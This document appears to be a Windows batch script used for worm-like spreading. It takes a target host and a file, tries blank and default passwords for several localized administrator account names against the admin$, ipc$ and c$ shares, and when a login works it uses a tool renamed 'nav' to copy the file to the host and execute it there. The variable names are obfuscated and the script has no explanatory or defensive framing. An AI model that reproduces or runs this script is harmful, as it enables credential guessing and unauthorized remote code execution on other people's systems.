@echo off
set attacker=net use         
set vvv=nav
set a=if not errorlevel 1
set b=goto 
set usad=/user:administrator
%attacker% \\%1\admin$ "" %usad% 
%a% %b% f33l
%attacker% \\%1\ipc$ "" %usad% 
%a% %b% f33l
%attacker% \\%1\c$ "" %usad% 
%a% %b% f33l
%attacker% \\%1\admin$ "" /user:admin
%a% %b% f33l
%attacker% \\%1\ipc$ "" /user:admin 
%a% %b% f33l
%attacker% \\%1\c$ "" /user:admin
%a% %b% f33l
%attacker% \\%1\admin$ "" /user:administrador
%a% %b% f33l
%attacker% \\%1\ipc$ "" /user:administrador 
%a% %b% f33l
%attacker% \\%1\c$ "" /user:administrador 
%a% %b% f33l
%attacker% \\%1\admin$ "" /user:administrateur
%a% %b% f33l
%attacker% \\%1\ipc$ "" /user:administrateur 
%a% %b% f33l
%attacker% \\%1\c$ "" /user:administrateur 
%a% %b% f33l
%attacker% \\%1\admin$ "administrator" %usad%
%a% %b% f33l
%attacker% \\%1\ipc$ "administrator" %usad% 
%a% %b% f33l
%attacker% \\%1\c$ "administrator" %usad% 
%a% %b% f33l
%attacker% \\%1\admin$ "admin" %usad%
%a% %b% f33l
%attacker% \\%1\ipc$ "admin" %usad% 
%a% %b% f33l
%attacker% \\%1\c$ "admin" %usad% 
%a% %b% f33l              
goto end
:f33l
%vvv% \\%1 attrib.exe -r %2
%vvv% \\%1 -f -c -d %2 -o
%vvv% \\%1 -d %2 -o
:end
